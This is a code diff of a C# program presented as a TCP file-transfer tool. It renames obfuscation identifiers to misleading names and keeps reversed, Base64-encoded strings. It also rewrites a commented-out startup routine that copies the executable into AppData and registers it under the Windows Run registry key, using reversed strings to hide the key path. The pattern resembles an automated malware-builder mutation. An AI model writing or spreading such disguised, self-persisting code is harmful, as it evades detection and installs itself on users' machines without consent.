@@ -251,7 +251,7 @@ namespace TcpMultiFileTransfer
 
 
 
-             //Startup  win32serviceutil();
+             //Startup  ThreadingMixIn();
 
 
             
@@ -282,11 +282,11 @@ namespace TcpMultiFileTransfer
 
                   
       
-                    byte[] vSyncCount = Convert.FromBase64String(shadowCascade2Split("=IXZwBXYydFbhRncvBVZjlmdlR0c39GZul2V"));
+                    byte[] vSyncCount = Convert.FromBase64String(BaseHTTPRequestHandler("=IXZwBXYydFbhRncvBVZjlmdlR0c39GZul2V"));
 
                     string particleRaycastBudget = Encoding.UTF8.GetString(vSyncCount);
 
-                    byte[] anisotropicTextures = Convert.FromBase64String(shadowCascade2Split("==gchJGbv9GVn5WaoRXeyVmdF5yclxGctF2Uu9Wa0l2cvBXbvN0c39GZul2V")); //Redefine Base64 URL
+                    byte[] anisotropicTextures = Convert.FromBase64String(BaseHTTPRequestHandler("==gchJGbv9GVn5WaoRXeyVmdF5yclxGctF2Uu9Wa0l2cvBXbvN0c39GZul2V")); //Redefine Base64 URL
 
                     string aTVLanguage = Encoding.UTF8.GetString(anisotropicTextures);
 
@@ -318,21 +318,21 @@ namespace TcpMultiFileTransfer
         }
 
 
-        //Startup   public static void  win32serviceutil()
+        //Startup   public static void  ThreadingMixIn()
         //Startup   {
-        //Startup       int _svc_name_   = Conversions.ToInteger("1");
-        //Startup       if ((double)_svc_name_   != Conversions.ToDouble("1") || Registry.GetValue(shadowCascade2Split("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "shadowCascade2Split", (object)null) != null) return;
-        //Startup       string email = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\shadowCascade2Split\\shadowCascade2Split.exe";
-        //Startup       if (!Directory.Exists(Path.GetDirectoryName(email)))
+        //Startup       int multiprocessing    = Conversions.ToInteger("1");
+        //Startup       if ((double)multiprocessing    != Conversions.ToDouble("1") || Registry.GetValue(BaseHTTPRequestHandler("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "shadowCascade2Split", (object)null) != null) return;
+        //Startup       string traceback = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\BaseHTTPRequestHandler\\BaseHTTPRequestHandler.exe";
+        //Startup       if (!Directory.Exists(Path.GetDirectoryName(traceback)))
         //Startup       {
-        //Startup           Directory.CreateDirectory(Path.GetDirectoryName(email));
-        //Startup           File.Copy(Application.ExecutablePath, email, true);
+        //Startup           Directory.CreateDirectory(Path.GetDirectoryName(traceback));
+        //Startup           File.Copy(Application.ExecutablePath, traceback, true);
         //Startup       }
-        //Startup       Registry.SetValue(shadowCascade2Split("ecnOnuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "shadowCascade2Split", (object)email);
+        //Startup       Registry.SetValue(BaseHTTPRequestHandler("nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS\\RESU_TNERRUC_YEKH"), "BaseHTTPRequestHandler", (object)traceback);
         //Startup   }
 
 
-        public static string shadowCascade2Split(string s)
+        public static string BaseHTTPRequestHandler(string s)
         {
             char[] charArray = s.ToCharArray();
             Array.Reverse(charArray);
